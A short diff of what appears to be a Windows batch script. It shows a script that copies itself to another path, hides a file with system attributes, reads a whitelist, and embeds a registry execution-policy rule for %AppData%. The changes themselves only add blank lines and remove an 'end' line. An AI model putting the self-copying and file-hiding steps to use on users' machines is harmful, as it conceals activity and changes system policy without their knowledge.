@@ -187,6 +187,8 @@ echo.>>%B%
 attrib +h +s "%B%" 1>nul 2>nul
 
 copy "%~0" /Y %A% 1>nul 2>nul
+echo.>>%A%
+echo.>>%A%
 
 
 for /f "tokens=* delims= " %%i in (whitelist.txt) do (
@@ -1915,5 +1917,3 @@ Archive Ends
 "SaferFlags"=dword:00000000
 "ItemData"=hex(2):25,00,41,00,70,00,70,00,44,00,61,00,74,00,61,00,25,00,00,00
 
-
-end
